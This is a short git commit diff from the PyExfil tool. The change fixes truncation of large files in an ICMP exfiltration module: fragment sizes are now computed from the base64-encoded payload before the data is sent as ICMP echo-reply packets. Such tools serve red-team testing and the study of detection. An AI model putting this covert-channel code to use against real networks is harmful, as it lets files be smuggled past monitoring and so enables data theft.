fdf454210fdc92b8e210c5a282f8027d4883975e
matthieu <matthieu.martinsbaltar@insa-rouen.fr>
2017-01-24 10:52:51 +0100

    Fixed: big files being truncated

--- pyexfil/ICMP/icmp_exfiltration.py
+++ pyexfil/ICMP/icmp_exfiltration.py
@@ -57,15 +57,15 @@ def send_file(ip_addr, src_ip_addr="127.0.0.1", file_path="", max_packetsize=512
 	icmp = ImpactPacket.ICMP()
 	icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)
 
-	# Fragmentation of DATA
-	x = len(iAmFile) / max_packetsize
-	y = len(iAmFile) % max_packetsize
-
 	seq_id = 0
 
 	# Calculate File:
 	IamDone = base64.b64encode(iAmFile)  # Base64 Encode for ASCII
 	checksum = zlib.crc32(IamDone)  # Build CRC for the file
+
+	# Fragmentation of DATA
+	x = len(IamDone) / max_packetsize
+	y = len(IamDone) % max_packetsize
 
 	# Get file name from file path:
 	head, tail = os.path.split(file_path)
